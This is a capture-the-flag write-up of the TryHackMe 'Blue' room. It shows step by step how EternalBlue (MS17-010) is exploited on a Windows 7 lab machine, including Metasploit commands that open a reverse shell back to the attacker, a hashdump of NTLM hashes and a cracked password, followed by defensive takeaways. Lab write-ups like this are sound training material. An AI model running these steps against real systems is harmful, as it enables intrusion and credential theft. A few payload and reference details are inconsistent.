<div align="center">

# 🔵 Blue — EternalBlue / MS17-010

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square&logo=tryhackme)](https://tryhackme.com/room/blue)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)]()
[![OS](https://img.shields.io/badge/OS-Windows_7-0078D6?style=flat-square&logo=windows)]()
[![CVE](https://img.shields.io/badge/CVE-2017--0144-critical?style=flat-square)](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
[![MITRE](https://img.shields.io/badge/MITRE-T1190%20%7C%20T1059.001%20%7C%20T1078-blue?style=flat-square)](https://attack.mitre.org/)

</div>

---

## 📋 Room Metadata

| Field | Detail |
|-------|--------|
| **Room URL** | https://tryhackme.com/room/blue |
| **Platform** | TryHackMe |
| **OS / Target** | Windows 7 SP1 x64 |
| **Difficulty** | Easy |
| **Category** | Network Exploitation, Privilege Escalation |
| **CVE** | CVE-2017-0144 (EternalBlue), CVE-2017-0145 (EternalRomance) |
| **Tools Used** | Nmap, Metasploit Framework, Meterpreter, John the Ripper |
| **Flags** | 3 (flag1.txt, flag2.txt, flag3.txt) |

---

## 🎯 Executive Summary

The target is a **Windows 7 SP1** machine exposing **SMBv1** on port 445, vulnerable to the **EternalBlue** exploit (CVE-2017-0144) — the same vulnerability behind WannaCry and NotPetya. By sending a specially crafted SMB request, an unauthenticated attacker gains a **SYSTEM-level reverse shell** via Metasploit's `ms17_010_eternalblue` module. Post-exploitation reveals three flags, credential hashes dumpable with Mimikatz/hashdump, and confirms the total absence of patching (MS17-010 patch released March 2017).

---

## 🔍 Reconnaissance

### 1. Host Discovery

```bash
nmap -sn 10.10.x.x/24
```

### 2. Full Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 -oN notes/full_scan.txt 10.10.x.x
```

<details>
<summary>📄 Nmap Output (click to expand)</summary>

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.x.x
Host is up (0.042s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 SP1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0144
|     Risk factor: HIGH
|     Description:
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|       servers (ms17-010).
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

</details>

### Key Findings

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 445 | SMB | Windows 7 SP1 | **Vulnerable to MS17-010** |
| 3389 | RDP | - | Potentially accessible post-auth |
| 135 | MSRPC | - | Standard Windows RPC |

### 3. Vulnerability Confirmation

```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.x.x
```

Result: `VULNERABLE` — confirms MS17-010 / EternalBlue is exploitable.

---

## 💥 Exploitation

### Tool: Metasploit Framework

```bash
msfconsole -q
```

```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       great   Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

### Configure and Launch

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.x.x
RHOSTS => 10.10.x.x
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.13.x.x
LHOST => 10.13.x.x
msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > run
```

<details>
<summary>📄 Exploitation Output (click to expand)</summary>

```
[*] Started reverse TCP handler on 10.13.x.x:4444
[*] 10.10.x.x:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.x.x:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.x.x:445 - Connecting to target for exploitation.
[+] 10.10.x.x:445 - Connection established for exploitation.
[+] 10.10.x.x:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.x.x:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.x.x:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.x.x:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.x.x:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.x.x:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.x.x:445 - Trying exploit with 12 Groom Allocations.
[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Sending stage (200262 bytes) to 10.10.x.x
[*] Meterpreter session 1 opened (10.13.x.x:4444 -> 10.10.x.x:49163)
```

</details>

### Shell Confirmation

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```

✅ **SYSTEM shell obtained immediately — no privilege escalation required.**

---

## 🏴 Post-Exploitation

### Upgrade Shell to Meterpreter

```
msf6 exploit(ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(shell_to_meterpreter) > set SESSION 1
msf6 post(shell_to_meterpreter) > run
```

### Flag 1 — Root of C:\

```
meterpreter > search -f flag*.txt
Found 3 results...
    c:\flag1.txt (24 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)

meterpreter > cat c:\flag1.txt
flag{REDACTED}
```

### Flag 2 — SAM Hive Location

```
meterpreter > cat "c:\Windows\System32\config\flag2.txt"
flag{REDACTED}
```

### Credential Dumping

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

### Crack Jon's Hash (John the Ripper)

```bash
echo "Jon:ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
alqfna22         (Jon)
```

### Flag 3 — Jon's Documents

```
meterpreter > cat "c:\Users\Jon\Documents\flag3.txt"
flag{REDACTED}
```

---

## 🗺️ MITRE ATT&CK Mapping

| Step | Action | Tactic | Technique ID | Technique Name |
|------|--------|--------|-------------|----------------|
| 1 | Nmap scan of target | Reconnaissance | T1046 | Network Service Discovery |
| 2 | SMB vulnerability scan | Reconnaissance | T1595.002 | Vulnerability Scanning |
| 3 | EternalBlue exploit via SMB | Initial Access | T1190 | Exploit Public-Facing Application |
| 4 | Reverse shell via SMB exploit | Execution | T1059.003 | Command & Scripting Interpreter: Windows Command Shell |
| 5 | `getuid` → NT AUTHORITY\SYSTEM | Privilege Escalation | T1068 | Exploitation for Privilege Escalation |
| 6 | `hashdump` from SAM | Credential Access | T1003.002 | OS Credential Dumping: SAM |
| 7 | Crack NTLM hash offline | Credential Access | T1110.002 | Brute Force: Password Cracking |
| 8 | Search for flag files | Discovery | T1083 | File and Directory Discovery |

---

## 🛡️ Defensive Takeaways

| Finding | Blue-Team Control |
|---------|------------------|
| SMBv1 enabled on Windows 7 | **Disable SMBv1** via PowerShell: `Set-SmbServerConfiguration -EnableSMB1Protocol $false` |
| MS17-010 unpatched | **Apply KB4012212** (March 2017 security bulletin) immediately; enforce automatic updates |
| No EDR detected | Deploy **endpoint detection and response** (e.g., CrowdStrike, Defender for Endpoint) |
| Weak user password (`alqfna22`) | Enforce **password complexity policy** + MFA; block common passwords |
| NTLM hashes extractable | Enable **Credential Guard** on Windows 10/11; disable NTLM where possible |
| No network segmentation | **Firewall rule**: block inbound TCP/445 from untrusted networks; isolate workstations |
| No intrusion detection | Deploy **IDS/IPS** with EternalBlue signatures (e.g., Snort SID 41978) |

---

## 📚 References

| Resource | Link |
|----------|------|
| NVD — CVE-2017-0144 | https://nvd.nist.gov/vuln/detail/CVE-2017-0144 |
| Microsoft Security Bulletin MS17-010 | https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010 |
| EternalBlue Technical Analysis (RiskSense) | https://blog.rapid7.com/2017/05/19/metasploit-the-power-of-the-community-and-eternalblue/ |
| Metasploit Module Docs | https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/ |
| MITRE ATT&CK — T1190 | https://attack.mitre.org/techniques/T1190/ |
| MITRE ATT&CK — T1003.002 | https://attack.mitre.org/techniques/T1003/002/ |
| TryHackMe Room | https://tryhackme.com/room/blue |

---

<div align="center">

**[⬆ Back to Journal Index](../../README.md)**

</div>
